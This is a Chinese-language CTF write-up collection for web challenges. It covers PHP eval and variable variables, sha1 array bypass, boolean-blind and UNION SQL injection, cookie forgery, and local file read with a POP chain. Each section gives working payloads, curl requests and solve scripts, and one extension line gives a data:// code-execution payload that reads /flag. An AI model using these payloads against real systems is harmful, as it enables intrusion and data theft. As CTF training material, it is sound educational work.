---
AIGC:
  ContentProducer: '001191110102MAD55U9H0F10002'
  ContentPropagator: '001191110102MAD55U9H0F10002'
  Label: '1'
  ProduceID: '2734c2cf-0c07-418f-9e6f-e6c4113e2d1c'
  PropagateID: '2734c2cf-0c07-418f-9e6f-e6c4113e2d1c'
  ReservedCode1: '06b1750d-a067-451b-aa3c-0d662165b0b3'
  ReservedCode2: '06b1750d-a067-451b-aa3c-0d662165b0b3'
---

# CTF 知识库 — Web方向

> 本文件由 CTF解题笔记本.md 自动拆分生成，如需查看完整原始笔记请参阅原文件。

---

## PHP 可变变量 + eval 代码执行

### 题目信息

| 项目 | 内容 |
|------|------|
| 题目类型 | Web - PHP 代码审计 |
| 难度 | 入门 |
| 日期 | 2026-07-30 |

### 题目源码

```
<?php  

error_reporting(0);
include "flag1.php";
highlight_file(__file__);
if(isset($_GET['args'])){
    $args = $_GET['args'];
    if(!preg_match("/^\w+$/",$args)){
        die("args error!");
    }
    eval("var_dump($$args);");
}
?>
```

### 解题思路

**1. 代码审计要点**

- `preg_match("/^\w+$/", $args)`：正则限制输入只能为单词字符（字母、数字、下划线），无法注入特殊字符
- `$$args`：PHP 可变变量（Variable Variables），若 `$args = "foo"`，则 `$$args` 等价于 `$foo`
- `eval("var_dump($$args);")`：将可变变量以 var_dump 形式输出

**2. 绕过思路**

正则只允许 `\w+`，无法直接调用函数或注入代码。但 PHP 内置了一个超全局数组 `$GLOBALS`，它保存了所有全局变量的引用，包括通过 `include "flag1.php"` 引入的 flag 变量。而 `GLOBALS` 完全由单词字符组成，完美通过正则检查。

**3. 执行流程**

```
args = "GLOBALS"
  ↓ 通过正则 /^\w+$/
$$args = $GLOBALS
  ↓ 可变变量解析
eval("var_dump($GLOBALS);")
  ↓ 输出所有全局变量
flag 暴露在输出中
```

### 解题 Payload

```
?args=GLOBALS
```

### 运行结果

```
array(7) {
  ["_GET"]=> array(1) { ["args"]=> string(7) "GLOBALS" }
  ["_POST"]=> array(0) { }
  ["_COOKIE"]=> array(0) { }
  ["_FILES"]=> array(0) { }
  ["ZFkwe3"]=> string(38) "flag{03bf915408d2349051395522ea5f4cf3}"
  ["args"]=> string(7) "GLOBALS"
  ["GLOBALS"]=> *RECURSION*
}
```

Flag: `flag{03bf915408d2349051395522ea5f4cf3}`

### 涉及知识点

| 知识点 | 说明 |
|--------|------|
| PHP 可变变量 | `$$var` 会先解析 `$var` 的值，再将结果作为变量名访问对应的变量 |
| PHP 超全局数组 | `$GLOBALS` 保存所有全局变量的引用，包括用户自定义的和系统内置的 |
| 正则绕过 | `\w` 匹配 `[a-zA-Z0-9_]`，`GLOBALS` 纯字母可通过 |
| eval 代码执行 | `eval()` 将字符串作为 PHP 代码执行，是常见漏洞入口 |
| error_reporting(0) | 关闭错误报告，隐藏潜在报错信息 |

### 同类变体与扩展

- 若过滤了 `GLOBALS`，可尝试其他超全局变量：`_GET`、`_POST`、`_SERVER` 等（但只能看到对应数组内容，不一定含 flag）
- 若 flag 变量名已知（如 `$flag`），可直接 `?args=flag` 访问
- 更严格过滤场景需结合其他 PHP 特性（如 `get_defined_vars()`、`get_defined_functions()` 等，但需能调用函数）

---

## PHP sha1 数组绕过 + 逻辑比较

### 题目信息

| 项目 | 内容 |
|------|------|
| 题目类型 | Web - PHP 代码审计 |
| 难度 | 入门 |
| 日期 | 2026-07-30 |

### 题目源码

```
<?php
highlight_file('flag.php');
$_GET['id'] = urldecode($_GET['id']);
$flag = 'flag{xxxxxxxxxxxxxxxxxx}';
if (isset($_GET['uname']) and isset($_POST['passwd'])) {
    if ($_GET['uname'] == $_POST['passwd'])

        print 'passwd can not be uname.';

    else if (sha1($_GET['uname']) === sha1($_POST['passwd'])&($_GET['id']=='margin'))

        die('Flag: '.$flag);

    else

        print 'sorry!';

}
?>
```

### 解题思路

**1. 代码审计要点**

- `urldecode($_GET['id'])`：对 id 做一次 URL 解码，最终需等于 `margin`
- `$_GET['uname'] == $_POST['passwd']`：弱比较，uname 和 passwd 不能相等
- `sha1($uname) === sha1($passwd)`：严格比较两个 SHA1 哈希，必须完全相同
- `$_GET['id']=='margin'`：id 必须等于 `margin`
- `&` 运算符：位与（非逻辑与 `&&`），但因 `===` 优先级更高，实际等价于 `(sha1===sha1) & (id==margin)`

**2. 核心漏洞：sha1() 数组绕过**

`sha1()` 函数接收数组参数时无法计算哈希，返回 `NULL` 并触发警告（默认不显示）：

```
sha1(array('a')) → NULL
sha1(array('b')) → NULL
NULL === NULL   → TRUE   ✓
```

同时，不同数组之间的 `==` 比较为 `FALSE`，绕过第一层检查：

```
array('a') == array('b') → FALSE  ✓ 通过"不相等"检查
```

**3. 运算符优先级陷阱**

```
sha1($uname) === sha1($passwd) & ($id == 'margin')
```

这里用的是 `&`（位与）而非 `&&`（逻辑与）。由于 `===` 优先级高于 `&`，实际解析为：

```
(sha1($uname) === sha1($passwd)) & ($id == 'margin')
```

`TRUE & TRUE` → `1`（真值），效果等同于 `&&`，不影响解题。

**4. 执行流程**

```
uname[]=1, passwd[]=2, id=margin
  ↓
uname(array) != passwd(array)  → TRUE, 通过第一层
  ↓
sha1(array) → NULL === NULL    → TRUE
id == 'margin'                 → TRUE
TRUE & TRUE                    → 1 (truthy)
  ↓
die('Flag: ...')  → 获得 flag
```

### 解题 Payload

| 参数 | 值 | 方式 |
|------|-----|------|
| id | `margin` | GET |
| uname | `uname[]=1` | GET（传数组） |
| passwd | `passwd[]=2` | POST（传数组） |

请求示例：

```
GET: ?id=margin&uname[]=1
POST: passwd[]=2
```

### 涉及知识点

| 知识点 | 说明 |
|--------|------|
| sha1/md5 数组绕过 | 哈希函数接收数组返回 NULL，`NULL === NULL` 为 TRUE |
| PHP 弱类型比较 | `==` 会自动类型转换，数组比较先比键值对数量和内容 |
| PHP 严格比较 | `===` 要求类型和值都相同，`NULL === NULL` 为 TRUE |
| 位运算符 & vs 逻辑运算符 && | `&` 是位与，`&&` 是逻辑与，优先级不同但此处效果一致 |
| urldecode 二次解码 | 服务器已自动解码一次，代码再解码一次，可能用于双编码绕过场景 |
| 数组参数传递 | `uname[]=1` 在 PHP 中将参数解析为数组 |

### 运行结果

```
curl "http://目标地址/?id=margin&uname[]=1" -d "passwd[]=2"

Flag: flag{f2bbcca065a83153280a94f74bb0ae81}
```

### 同类变体与扩展

- `md5()` 同样存在数组绕过，`md5(array)` 也返回 `NULL`
- 若条件改为 `sha1($uname) == sha1($passwd)`（弱比较），除数组绕过外还可寻找 SHA1 碰撞（理论可行，实际极难）
- 若过滤了数组参数，可研究 SHA1 碰撞文件（如 SHAttered 攻击中的两个 PDF）
- `urldecode` 双编码技巧：`?id=%256Dargin` → 服务器解码为 `%6Dargin` → urldecode 解码为 `margin`，可用于绕过 WAF 对 `margin` 关键词的拦截

---

## Flask 布尔盲注 SQL 注入

### 题目信息

| 项目 | 内容 |
|------|------|
| 题目类型 | Web - SQL 注入（布尔盲注） |
| 难度 | 中等 |
| 日期 | 2026-07-30 |

### 题目描述

Flask + Werkzeug 应用，首页提示"开发者忘记删除测试账号了"。入口路径 `/admin/login`，登录后 `/admin` 提示"flag 在 flag 表中"。登录表单有基于时间的 SQL 注入过滤器。

### 解题思路

**1. 信息收集**

- Flask/Werkzeug 调试模式开启，JSON 请求触发报错可看到源码
- 源码泄露：`app.py` 使用 `filter_time_based_sql_injection` 过滤 SLEEP/WAITFOR/DELAY/RAND/BENCHMARK
- 但 UNION SELECT、OR、AND 等关键词未被过滤
- 测试账号：`test / 123456`

**2. SQL 注入验证**

在用户名字段注入，利用布尔条件差异判断：

```
test' AND 1=1 AND '1'='1    → 登录成功（条件为真）
test' AND 1=2 AND '1'='1    → 登录失败（条件为假）
```

**3. 布尔盲注提取 flag**

利用 `SUBSTRING` + `ASCII` + 二分搜索逐字符提取：

```
# 判断 flag 长度
test' AND (SELECT LENGTH(flag) FROM flag LIMIT 1)>N AND '1'='1

# 提取每个字符（ASCII 二分搜索）
test' AND ASCII(SUBSTRING((SELECT flag FROM flag LIMIT 1),pos,1))>N AND '1'='1
```

二分搜索将每个字符的查询次数从 ~95 降至 ~7，38 字符的 flag 约需 266 次请求。

**4. 注意事项**

- Python `urllib.parse.urlencode` 会将单引号编码为 `%27`，导致 SQL 注入失效
- 需使用 `http.client` 手动构造请求体，保持原始单引号不编码
- `SUBSTRING` 在 MySQL 和 SQLite 中均可使用

### 解题 Payload

```
# 布尔盲注 - 验证条件
POST /admin/login
username=test' AND (SELECT COUNT(*) FROM flag)>0 AND '1'='1&password=123456

# 提取 flag 逐字符（二分搜索 ASCII 值）
username=test' AND ASCII(SUBSTRING((SELECT flag FROM flag LIMIT 1),1,1))>90 AND '1'='1&password=123456
```

### 运行结果

```
Flag length: 38
[1] f => f
[2] l => fl
...
[38] } => flag{4e8a47682414b4fba441d2a4108ba632}
```

Flag: `flag{4e8a47682414b4fba441d2a4108ba632}`

### 涉及知识点

| 知识点 | 说明 |
|--------|------|
| 布尔盲注 | 通过页面返回差异（登录成功/失败）判断 SQL 条件真假 |
| 二分搜索优化 | ASCII 范围 32-126，二分搜索每字符约 7 次请求 |
| Werkzeug 调试模式泄露源码 | Flask debug=True 时错误页暴露源码路径和变量名 |
| SQL 注入过滤器绕过 | 仅过滤时间盲注关键词，未过滤 UNION/AND/OR/SELECT |
| URL 编码陷阱 | Python urllib 会编码单引号导致注入失效，需用 http.client |
| SUBSTRING + ASCII | 经典字符提取组合，MySQL 和 SQLite 均支持 |

### 同类变体与扩展

- 若过滤了引号，可用 `CHAR()` 函数替代
- 若过滤了 SUBSTRING，可用 `MID()`、`LEFT()`、`RIGHT()` 替代
- 若过滤了 AND，可用 `&&` 或嵌套条件替代
- 时间盲注：当页面无布尔差异时，用 `IF(condition, SLEEP(3), 0)` 制造延迟差异
- 报错注入：用 `extractvalue()`、`updatexml()` 等函数将数据暴露在错误信息中

---

## PHP 正则混淆 + Base64 构造文件读取

### 题目信息

| 项目 | 内容 |
|------|------|
| 题目类型 | Web - PHP 代码审计 |
| 难度 | 中等 |
| 日期 | 2026-07-31 |

### 题目源码

```php
<?php 
error_reporting(0);
$zero=$_REQUEST['zero'];
$first=$_REQUEST['first'];
$second=$zero.$first;
if(preg_match_all("/Yeedo|wants|a|girl|friend|or|a|flag/i",$second)){
    $key=$second;
    if(preg_match("/\.\.|flag/",$key)){
        die("Noooood hacker!");
    }else{
        $third=$first;
        if(preg_match("/\\|\056\160\150\x70/i",$third)){
            $end=substr($third,5);
            highlight_file(base64_decode($zero).$end);//maybe flag in flag.php
        }
    }
}
else{
    highlight_file(__FILE__);
}
```

### 解题思路

**1. 代码流程梳理**

```
$zero = $_REQUEST['zero']
$first = $_REQUEST['first']
$second = $zero . $first
    ↓
检查1: $second 是否匹配 /Yeedo|wants|a|girl|friend|or|a|flag/i
    ↓ 通过
检查2: $second 是否匹配 /\.\.|flag/  → 不能含 ".." 或 "flag"
    ↓ 通过
检查3: $first 是否匹配 /\\|\056\160\150\x70/i
    ↓ 通过
执行: highlight_file(base64_decode($zero) . substr($first, 5))
```

**2. 第一层正则分析**

```php
preg_match_all("/Yeedo|wants|a|girl|friend|or|a|flag/i", $second)
```

- `preg_match_all` 返回匹配次数，>0 即为 truthy
- `|` 是正则 alternation（或），匹配其中任一词即可
- `a` 是独立分支 — 只要 `$zero.$first` 中含字母 `a` 即通过
- `flag` 也在列表中，但第二层会拦截 `flag`

**3. 第二层正则分析**

```php
preg_match("/\.\.|flag/", $key)  // $key = $second = $zero.$first
```

- `..` 禁止目录穿越
- `flag` 禁止明文出现 "flag" 字符串
- 关键约束：`$zero` 和 `$first` 拼接后不能出现 "flag"

**4. 第三层正则分析（核心难点）**

```php
preg_match("/\\|\056\160\150\x70/i", $third)  // $third = $first
```

PHP 双引号字符串转义解析：

| 源码 | PHP 转义后 | 含义 |
|------|-----------|------|
| `\\` | `\` | 正则转义前缀 |
| `\|` | `\|` | 匹配字面 `|` 管道符 |
| `\056` | `.` (ASCII 46) | 匹配任意字符 |
| `\160` | `p` (ASCII 112) | 匹配 `p` |
| `\150` | `h` (ASCII 104) | 匹配 `h` |
| `\x70` | `p` (ASCII 112) | 匹配 `p` |

最终正则模式：`\|.php`（带 `/i` 标志）

- `\|` — 匹配字面管道符 `|`
- `.` — 匹配任意字符
- `php` — 匹配 "php"

所以 `$first` 必须包含 `|` + 任意字符 + `php` 的模式。

**5. 最终执行语句**

```php
highlight_file(base64_decode($zero) . substr($first, 5))
```

需要让结果等于 `flag.php`。

**6. 构造 Payload**

思路：让 `base64_decode($zero) = "flag.php"`，`substr($first, 5) = ""`

```
zero = base64_encode("flag.php") = "ZmxhZy5waHA="
first = "|.php"  (恰好5个字符)
```

验证：

```
base64_decode("ZmxhZy5waHA=") = "flag.php"
substr("|.php", 5) = ""  (字符串恰好5字符，截取为空)
最终: highlight_file("flag.php" . "") = highlight_file("flag.php")
```

三层检查验证：

| 检查 | 条件 | 结果 |
|------|------|------|
| 1. 关键词匹配 | `$second="ZmxhZy5waHA=\|.php"` 含 `a`（在 "waHA" 中） | PASS ✓ |
| 2. 禁止 flag/.. | `$second` 不含 "flag" 也不含 ".." | PASS ✓ |
| 3. \|\.php 匹配 | `$first="\|.php"` 匹配 `|` + `.` + `php` | PASS ✓ |

### 解题 Payload

```
?zero=ZmxhZy5waHA=&first=|.php
```

URL 编码版本（`|` 编码为 `%7C`，`=` 编码为 `%3D`）：

```
?zero=ZmxhZy5waHA%3D&first=%7C.php
```

### 替代方案

另一种构造方式（split 在不同位置）：

```
zero = base64_encode("flag") = "ZmxhZw=="
first = "aaaa|.php"
```

```
base64_decode("ZmxhZw==") = "flag"
substr("aaaa|.php", 5) = ".php"
最终: "flag" + ".php" = "flag.php"
```

`$second = "ZmxhZw==aaaa|.php"` — 含 `a`，不含 `flag`/`..`，`$first` 匹配 `|.php` ✓

```
?zero=ZmxhZw==&first=aaaa|.php
```

### 验证脚本

```python
import base64, re

zero = base64.b64encode(b'flag.php').decode()
first = '|.php'
second = zero + first

print(f'zero      = {zero}')
print(f'first     = {first}')
print(f'second    = {second}')
print(f'b64decode = {base64.b64decode(zero).decode()}')
print(f'substr5   = {repr(first[5:])}')
print(f'final     = {base64.b64decode(zero).decode() + first[5:]}')
print()

# 三层检查
m1 = re.findall(r'Yeedo|wants|a|girl|friend|or|a|flag', second, re.IGNORECASE)
print(f'check1 (keyword): {"PASS" if m1 else "FAIL"} matches={m1}')

m2 = re.search(r'\.\.|flag', second)
print(f'check2 (no ..|flag): {"PASS" if not m2 else "FAIL"}')

m3 = re.search(r'\|.php', first, re.IGNORECASE)
print(f'check3 (|.php): {"PASS" if m3 else "FAIL"} match={m3.group()}')

print(f'\nPayload: ?zero={zero}&first={first}')
```

### 涉及知识点

| 知识点 | 说明 |
|--------|------|
| PHP 双引号转义 | `\\` → `\`，`\056` → `.`(八进制)，`\x70` → `p`(十六进制) |
| 正则 alternation | `\|` 的辨析：正则中 `\|` 匹配字面管道符，`|` 是 alternation |
| preg_match_all | 返回匹配次数，>0 为 truthy，用于条件判断 |
| Base64 编码绕过 | 用 base64 编码 "flag.php"，绕过 `flag` 明文检测 |
| substr 截取 | `substr($str, 5)` 从位置5截取到末尾，用于拆分路径 |
| 正则拼装消歧 | `\|.php` 中 `\|` 是字面管道，`.` 是正则通配符（任意字符） |
| highlight_file | PHP 函数，高亮显示源码，CTF 中常用于读取文件内容 |

### 同类变体与扩展

- 若第三层正则不同，需根据实际转义后的模式调整 `$first` 构造
- 若 `flag` 被更严格过滤（包括 base64 后检测），可将路径拆分到 `zero` 和 `first` 两部分
- 若无 `highlight_file`，可尝试 `readfile()`、`file_get_contents()`、`include` 等替代函数
- 若有 `open_basedir` 限制，需结合目录穿越或其他绕过方式
- PHP 八进制 `\NNN`、十六进制 `\xNN` 转义在双引号字符串和正则中含义不同，需区分 PHP 层转义和正则层转义

---

## UNION 注入 SQL 注入（登录回显）

### 题目信息

| 项目 | 内容 |
|------|------|
| 题目类型 | Web - SQL 注入（UNION 回显注入） |
| 难度 | 入门 |
| 日期 | 2026-08-01 |
| 目标 | https://0bd8e8c240fd974787b65d21.http-ctf2.dasctf.com/ |

### 题目描述

登录窗口，页面提示"用 sqlmap 是没有灵魂的"。用户名和密码通过 GET 参数传递到 `check.php` 进行查询，登录成功后页面回显用户名和密码字段。3 列查询，回显位为第 2、3 列。

### 解题思路

**1. 确认注入点和回显位**

用户信息提示可用 `a' union select 1,2,3#` 进行注入，提交后页面回显 `Hello 2！` 和 `Your password is '3'`，确认：
- 查询共 3 列
- 第 2 列回显在用户名位置
- 第 3 列回显在密码位置

**2. UNION 注入标准流程**

```
Step 1: 确定列数和回显位 → union select 1,2,3
Step 2: 获取数据库信息   → database(), version()
Step 3: 枚举表名         → information_schema.tables
Step 4: 枚举列名         → information_schema.columns
Step 5: dump 数据        → 直接查目标表
```

**3. 信息收集**

```
数据库名: geek
数据库版本: MariaDB 10.3.18
```

**4. 枚举表名**

从 `information_schema.tables` 获取当前数据库的表：

```
geekuser, l0ve1ysq1
```

**5. 枚举列名**

从 `information_schema.columns` 获取 `l0ve1ysq1` 表的列（表名用十六进制编码避免引号）：

```
id, username, password
```

**6. 提取 flag**

dump 全表数据，用 `group_concat` 合并输出，`0x7c`（`|`）分隔字段，`0x0a`（换行）分隔记录：

```
1|cl4y|wo_tai_nan_le
2|glzjin|glzjin_wants_a_girlfriend
...
16|flag|CTF2{4272c390-2265-40a3-b578-1661895a2d96}
```

第 16 条记录 username 为 `flag`，password 即为 flag。

### 解题 Payload（逐步）

```
# 1. 确认回显位
?username=a' union select 1,2,3#&password=1

# 2. 获取数据库名和版本
?username=a' union select 1,database(),version()#&password=1

# 3. 枚举表名
?username=a' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#&password=1

# 4. 枚举列名（表名 l0ve1ysq1 的十六进制: 0x6c3076653179737131）
?username=a' union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x6c3076653179737131#&password=1

# 5. dump 全表数据
?username=a' union select 1,2,group_concat(id,0x7c,username,0x7c,password,0x0a) from l0ve1ysq1#&password=1
```

### 运行结果

```
数据库名: geek
数据库版本: 10.3.18-MariaDB
表名: geekuser, l0ve1ysq1
列名: id, username, password

l0ve1ysq1 表数据:
1|cl4y|wo_tai_nan_le
2|glzjin|glzjin_wants_a_girlfriend
3|Z4cHAr7zCr|biao_ge_dddd_hm
4|0xC4m3l|linux_chuang_shi_ren
5|Ayrain|a_rua_rain
6|Akko|yan_shi_fu_de_mao_bo_he
7|fouc5|cl4y
8|fouc5|di_2_kuai_fu_ji
9|fouc5|di_3_kuai_fu_ji
10|fouc5|di_4_kuai_fu_ji
11|fouc5|di_5_kuai_fu_ji
12|fouc5|di_6_kuai_fu_ji
13|fouc5|di_7_kuai_fu_ji
14|fouc5|di_8_kuai_fu_ji
15|leixiao|Syc_san_da_hacker
16|flag|CTF2{4272c390-2265-40a3-b578-1661895a2d96}
```

Flag: `CTF2{4272c390-2265-40a3-b578-1661895a2d96}`

### 涉及知识点

| 知识点 | 说明 |
|--------|------|
| UNION 注入 | 利用 UNION SELECT 合并查询，在回显位输出数据库信息 |
| 回显位确定 | `union select 1,2,3` 确定哪些列会回显到页面上 |
| information_schema | MySQL 系统库，存储所有表/列的元信息 |
| group_concat | 将多行结果合并为一个字符串输出，避免只能看到最后一行 |
| 十六进制编码表名 | `0x6c3076653179737131` = `l0ve1ysq1`，避免引号过滤 |
| GET 参数注入 | 用户名/密码通过 URL 参数传递，可直接构造 payload |
| # 注释符 | MySQL 中 `#` 注释掉后续 SQL 语句（也可用 `-- -`） |

### 同类变体与扩展

- 若过滤了 `union`/`select`，可尝试大小写混写、双写、内联注释 `/**/` 绕过
- 若无回显位，改为布尔盲注或时间盲注（参考第3题）
- 若列数不对，用 `order by N` 逐步确定列数
- 若 `information_schema` 被禁，MariaDB 可用 `mysql.innodb_table_stats` 替代查表名
- 若 `group_concat` 被过滤，用 `limit N,1` 逐行读取
- POST 型注入：参数在请求体中，需用 Burp Suite 抓包修改（参考第3题 Flask 布尔盲注）

---

## PHP 逻辑绕过 + Cookie 伪造（Buy Flag）

### 题目信息

| 项目 | 内容 |
|------|------|
| 题目类型 | Web - PHP 代码审计 + Cookie 伪造 |
| 难度 | 入门 |
| 日期 | 2026-08-01 |
| 目标 | http://3ef2662d10e2a8da26717522.http-ctf2.dasctf.com:80 |

### 题目描述

Syclover 的 Buy Flag 页面，提示购买 flag 需要满足三个条件：
1. 拥有 100000000（一亿）money
2. 是 CUIT（成都信息工程大学）的学生
3. 答对密码

### 源码发现

页面 HTML 注释中隐藏了 PHP 后端逻辑：

```php
<!--
~~~post money and password~~~
if (isset($_POST['password'])) {
    $password = $_POST['password'];
    if (is_numeric($password)) {
        echo "password can't be number</br>";
    }elseif ($password == 404) {
        echo "Password Right!</br>";
    }
}
-->
```

### 解题思路

**1. 三个绕过点分析**

| 条件 | 绕过方式 |
|------|---------|
| ① password 不能是数字，但要 == 404 | `is_numeric('404a')` 返回 FALSE，但 `'404a' == 404` 为 TRUE（弱比较截取数字部分） |
| ② 必须是 CUIT 学生 | Cookie `user=0` 改为 `user=1` |
| ③ 拥有一亿 money | POST `money` 参数，用数组 `money[]=1` 绕过数值比较 |

**2. password 弱类型绕过**

```php
is_numeric('404a')  → FALSE   // 不通过 is_numeric 检查
'404a' == 404        → TRUE   // PHP 弱比较：字符串开头数字部分与整数比较
```

PHP `==` 比较字符串和数字时，会取字符串开头的数字部分进行比较，忽略后面的非数字字符。`'404a'` 的数字部分为 `404`，与 `404` 相等。

**3. Cookie 伪造**

页面设置 Cookie `user=0`，服务端以此判断是否为 CUIT 学生。将 `user` 改为 `1` 即可。

**4. money 绕过**

后端可能通过 `$_POST['money']` 与 100000000 比较来检查余额。传入数组 `money[]=1`：
- PHP 中数组与整数比较结果为 FALSE（或不可预期），绕过余额检查
- 也可传 `money=1e9`（科学计数法 = 1000000000）绕过字符串比较

**5. 完整请求构造**

```
POST /pay.php HTTP/1.1
Cookie: user=1
Content-Type: application/x-www-form-urlencoded

password=404a&money[]=1
```

### 解题 Payload

```bash
curl -X POST "http://3ef2662d10e2a8da26717522.http-ctf2.dasctf.com/pay.php" \
  -H "Cookie: user=1" \
  -d "password=404a&money[]=1"
```

### 运行结果

```
you are Cuiter</br>Password Right!</br>CTF2{bb4ae566-9ae0-4e0a-b9d6-9d3bd18b1b2f}
```

Flag: `CTF2{bb4ae566-9ae0-4e0a-b9d6-9d3bd18b1b2f}`

### 涉及知识点

| 知识点 | 说明 |
|--------|------|
| PHP 弱类型比较 | `==` 比较时自动类型转换，`'404a' == 404` 为 TRUE |
| is_numeric 绕过 | `is_numeric()` 对含非数字字符的字符串返回 FALSE |
| HTML 注释藏源码 | 开发者将 PHP 逻辑写在 HTML 注释中，View Source 即可看到 |
| Cookie 伪造 | 修改 Cookie 值绕过身份验证 |
| 数组绕过 | 传数组参数 `money[]=1` 使数值比较失效 |
| 科学计数法绕过 | `1e9` = 1000000000，可绕过字符串等值比较 |
| POST 参数操控 | 直接构造 POST 请求体，无需通过页面表单 |

### 同类变体与扩展

- 若 `is_numeric` 换成 `ctype_digit`，可用 `404\0`（空字节截断）绕过
- 若 `==` 换成 `===`（严格比较），弱类型绕过失效，需寻找其他逻辑缺陷
- 若 Cookie 有签名校验（如 JWT），需伪造或利用密钥泄露
- 若 money 比较用 `intval()`，可利用 `intval('1e9')` = 1 的特性（科学计数法被截断）
- 信息泄露的其他常见位置：`.git/`、`.svn/`、`backup.sql`、`robots.txt`、`phpinfo()`
- 常见 PHP 弱比较绕过：`0 == 'abc'` (TRUE)、`'1' == '01'` (TRUE)、`'10' == '1e1'` (TRUE)

---

## 文件上传 — 任意文件读取 (LFI)

### 题目信息

| 项目 | 内容 |
|------|------|
| 题目类型 | Web - 文件上传 + 任意文件读取 |
| 难度 | 入门 |
| 日期 | 2026-08-02 |
| 题目URL | `https://dc5195734acf8891d7bf4112.http-ctf2.dasctf.com/` |

### 题目页面

页面有两个功能模块：
- **图片查看**：通过 `file.php?f=<文件名>` 读取文件内容
- **图片上传**：通过 `upload.php` 上传文件（POST multipart/form-data）

### 源码审计

通过 `file.php` 读取三个 PHP 文件源码（`file.php`、`upload.php`、`class.php`）：

**file.php**（文件读取接口）：

```php
$filename = $_GET['f'];
$show = new Show($filename);
$show->show();
```

**class.php** — `Show::show()`（核心漏洞点）：

```php
class Show {
    public function show() {
        if(preg_match('/http|https|file:|php:|gopher|dict|\.\./i', $this->source)) {
            die('illegal fname :P');
        } else {
            echo file_get_contents($this->source);
            // ... 输出 base64 图片
        }
    }
}
```

**class.php** — `Upload::file_check()`（上传过滤逻辑）：

```php
function file_check() {
    $allowed_types = array("png");
    $temp = explode(".", $this->f["file"]["name"]);
    $extension = end($temp);
    // 扩展名白名单：只允许 png
    
    $filter = '/<\?php|php|exec|passthru|popen|proc_open|shell_exec|system|phpinfo|assert|chroot|getcwd|scandir|delete|rmdir|rename|chgrp|chmod|chown|copy|mkdir|file|file_get_contents|fputs|fwrite|dir/i';
    // 内容黑名单：禁止 <?php、php、exec、system 等关键字
    if(preg_match_all($filter, $f)) {
        echo 'what are you doing!! :C';
        return false;
    }
}
```

### 漏洞分析

**主要漏洞：`file.php` 任意文件读取（LFI）**

`Show::show()` 中 `file_get_contents($this->source)` 的过滤存在缺陷：

| 过滤内容 | 绕过方式 |
|---------|---------|
| `http` / `https` | 不使用网络协议 |
| `file:` / `php:` | 不使用协议封装器 |
| `gopher` / `dict` | 不使用协议封装器 |
| `..` (目录穿越) | 使用绝对路径，不需要 `..` |
| **绝对路径（未过滤）** | **直接读取 `/flag`** |

> **关键**：过滤了协议封装器和 `..` 目录穿越，但**完全没有限制绝对路径**。这意味着可以直接用 `file.php?f=/flag` 读取根目录下的 flag 文件。

**备选攻击面：POP 链反序列化（未使用但值得记录）**

`class.php` 中存在一条完整的 POP 链，可通过文件上传触发：

```
Test::__destruct()       → echo $this->str  ($str = Upload对象)
  → Upload::__toString() → echo $this->fname->$this->fsize  ($fname = Show对象)
    → Show::__get($fsize) → $this->ok($fsize)  (ok方法不存在)
      → Show::__call('ok', [$fsize]) → backdoor(end($arguments))
        → include($door)  ← 包含上传的 png 文件执行代码
```

`Upload::file_check()` 虽然禁止了 `<?php` 等关键字，但可以通过以下方式绕过：
- `<?= ?>` 短标签（如果短标签开启）
- `.htaccess` / `.user.ini` 修改解析方式
- 利用 `include()` 特性：不需要 `<?php` 标签也能执行（但需要 PHP 代码块标识）

### 解题过程

**最短路径：直接读取 /flag**

```
GET /file.php?f=/flag
```

利用 `file_get_contents` 无绝对路径限制的缺陷，直接读取系统根目录下的 flag 文件：

```python
import requests

r = requests.get("https://dc5195734acf8891d7bf4112.http-ctf2.dasctf.com/file.php?f=/flag")
# 响应: CTF2{1cd01c68-f86c-49aa-b4e0-7ffb38d98ae5}<img src=data:jpg;base64,... />
flag = r.text.split('<img')[0].strip()
print(flag)  # CTF2{1cd01c68-f86c-49aa-b4e0-7ffb38d98ae5}
```

**利用过程：**

```
[1] 访问首页 → 发现"图片查看"和"图片上传"两个功能
[2] file.php?f=upload.php → 读取上传处理源码
[3] file.php?f=class.php  → 读取核心类定义 → 发现 file_get_contents 未过滤绝对路径
[4] file.php?f=/flag      → 直接读取 flag
```

Flag: `CTF2{1cd01c68-f86c-49aa-b4e0-7ffb38d98ae5}`

### 涉及知识点

| 知识点 | 说明 |
|--------|------|
| 任意文件读取 (LFI) | `file_get_contents()` 接收用户输入但未限制路径，可读取任意文件 |
| PHP 协议过滤缺陷 | 过滤了 `http/https/file:/php:/gopher/dict` 但遗漏绝对路径 |
| 文件上传白名单+黑名单 | 扩展名白名单(`png`) + 内容黑名单(`<?php\|exec\|system` 等) |
| POP 链 (反序列化) | `__destruct→__toString→__get→__call→backdoor→include`，备选攻击路径 |
| `include()` 执行 | `backdoor()` 中 `include($door)` 可执行 PHP 文件，需绕过内容过滤 |

> **技巧**：文件上传题先审源码再动手。通过 `file.php` 等读取接口获取服务器端 PHP 源码，往往能发现比上传更简单的攻击路径（如本题的 LFI 直接读 flag）。

> **技巧**：`file_get_contents()` 的路径过滤常见缺陷：① 只过滤 `..` 不限绝对路径；② 只过滤 `http://` 不过滤 `/`；③ 遗漏 `php://filter`（本题过滤了 `php:`）；④ 未过滤 `data://` 协议。CTF 中遇到 `file_get_contents` 优先测试绝对路径和协议封装器。

> **技巧**：PHP 类中的魔术方法链（`__destruct→__toString→__get→__call`）是反序列化利用的核心。即使题目没有显式的 `unserialize()`，也可能通过 `phar://` 协议触发反序列化（`file_get_contents` 支持 `phar://`）。

### 同类变体与扩展

- **`php://filter` 绕过**：若过滤了 `php:` 可尝试大小写 `PHP://filter` 或 `PhP://filter`（取决于正则是否区分大小写，本题用了 `i` 修饰符）
- **`data://` 协议**：`data://text/plain,<?php system('cat /flag');?>` 可直接执行代码（需 `allow_url_include=On`）
- **`phar://` 反序列化**：上传 phar 文件后通过 `phar://upload/xxx.png` 触发反序列化，利用 POP 链 RCE
- **`.user.ini` 绕过**：上传 `.user.ini` 文件设置 `auto_prepend_file=shell.png`，使所有 PHP 文件自动包含 webshell
- **防御建议**：文件读取接口应使用白名单（允许的文件列表），而非黑名单过滤协议；`file_get_contents` 应结合 `realpath()` 检查最终路径是否在允许范围内

### 解题脚本

完整脚本：[Web/20-file-upload-llf/solve.py](Web/20-file-upload-llf/solve.py)

```python
import requests

BASE = "https://dc5195734acf8891d7bf4112.http-ctf2.dasctf.com"

# 1. 源码审计
for f in ['file.php', 'upload.php', 'class.php']:
    r = requests.get(f"{BASE}/file.php?f={f}")
    print(r.text.split('<img')[0])

# 2. 读取 flag
